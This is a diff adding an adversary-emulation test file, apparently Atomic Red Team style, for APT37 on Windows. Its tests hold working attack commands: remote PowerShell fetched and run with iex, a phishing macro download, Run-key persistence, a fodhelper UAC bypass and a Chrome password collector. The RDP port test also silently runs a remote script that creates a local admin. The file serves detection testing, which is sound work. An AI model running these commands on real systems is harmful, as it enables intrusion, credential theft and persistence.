@@ -1,0 +1,131 @@
+attack_technique: APT37
+display_name: APT37
+atomic_tests:
+- name: Download Macro-Enabled Phishing Attachment and Execution
+  auto_generated_guid: nhom74-cdkn
+  description: |
+    This atomic test downloads a macro enabled document from the Atomic Red Team GitHub repository, simulating an end user clicking a phishing link to download the file.
+    The file "PhishingAttachment.xlsm" is downloaded to the %temp% directory.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      $url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm
+      $script_path = 'C:\AtomicRedTeam\atomics\APT37\src\phishing_cmd.cmd'
+      Start-Process $script_path
+    name: powershell
+    cleanup_command: |
+      Remove-Item $env:TEMP\PhishingAttachment.xlsm -ErrorAction Ignore
+- name: WinPwn - winPEAS
+  auto_generated_guid: 
+  description: Discover Local Privilege Escalation possibilities using winPEAS function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')
+      winPEAS -noninteractive -consoleoutput
+    name: powershell
+- name: Reg Key Run
+  auto_generated_guid: 
+  description: |
+    Run Key Persistence
+
+    Upon successful execution, cmd.exe will modify the registry by adding \"Atomic Red Team\" to the Run key. Output will be via stdout. 
+  supported_platforms:
+  - windows
+  input_arguments:
+    command_to_execute:
+      description: Thing to Run
+      type: path
+      default: C:\AtomicRedTeam\atomics\APT37\src\AtomicRedTeam.exe
+  executor:
+    command: |
+      REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "#{command_to_execute}"
+    cleanup_command: |
+      REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /f >nul 2>&1
+    name: command_prompt
+- name: Bypass UAC using Fodhelper - PowerShell
+  auto_generated_guid: 
+  description: |
+    PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
+    Upon execution command prompt will be opened.
+  supported_platforms:
+  - windows
+  input_arguments:
+    executable_binary:
+      description: Binary to execute with UAC Bypass
+      type: path
+      default: C:\Windows\System32\cmd.exe
+  executor:
+    command: |
+      New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
+      New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
+      Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
+      Start-Process "C:\Windows\System32\fodhelper.exe"
+    cleanup_command: |
+      Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse -ErrorAction Ignore
+    name: powershell
+- name: Run Chrome-password Collector
+  auto_generated_guid: 
+  description: |
+    A modified sysinternals suite will be downloaded and staged. The Chrome-password collector, renamed accesschk.exe, will then be executed from #{file_path}.
+
+    Successful execution will produce stdout message stating "Copying db ... passwordsDB DB Opened. statement prepare DB connection closed properly". Upon completion, final output will be a file modification of PathToAtomicsFolder\..\ExternalPayloads\sysinternals\passwordsdb.
+
+    Adapted from [MITRE ATTACK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/credential-access/e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d.yml)
+  supported_platforms:
+  - windows
+  input_arguments:
+    file_path:
+      description: File path for modified Sysinternals
+      type: string
+      default: PathToAtomicsFolder\..\ExternalPayloads
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Modified Sysinternals must be located at #{file_path}
+    prereq_command: |
+      if (Test-Path "#{file_path}\SysInternals") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      Invoke-WebRequest "https://github.com/mitre-attack/attack-arsenal/raw/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/Modified-SysInternalsSuite.zip" -OutFile "#{file_path}\Modified-SysInternalsSuite.zip"
+      Expand-Archive "#{file_path}\Modified-SysInternalsSuite.zip" "#{file_path}\sysinternals" -Force
+      Remove-Item "#{file_path}\Modified-SysInternalsSuite.zip" -Force
+  executor:
+    command: |
+      Set-Location -path "#{file_path}\Sysinternals";
+      ./accesschk.exe -accepteula .;
+    cleanup_command: |
+      Remove-Item "#{file_path}\Sysinternals" -Force -Recurse -ErrorAction Ignore
+    name: powershell
+- name: Changing RDP Port to Non Standard Port via Powershell
+  auto_generated_guid: 
+  description: |
+    Changing RDP Port to Non Standard Port via Powershell
+  supported_platforms:
+  - windows
+  input_arguments:
+    OLD_Remote_Port:
+      description: Default RDP Listening Port
+      type: string
+      default: "3389"
+    NEW_Remote_Port:
+      description: New RDP Listening Port
+      type: string
+      default: "4489"
+  executor:
+    command: |
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')
+      Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "PortNumber" -Value #{NEW_Remote_Port}
+      New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort #{NEW_Remote_Port}
+    cleanup_command: |
+      Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "PortNumber" -Value #{OLD_Remote_Port}
+      Remove-NetFirewallRule -DisplayName "RDPPORTLatest-TCP-In" -ErrorAction Ignore 
+      Get-Service TermService | Restart-Service -Force -ErrorAction Ignore 
+    name: powershell
+    elevation_required: true
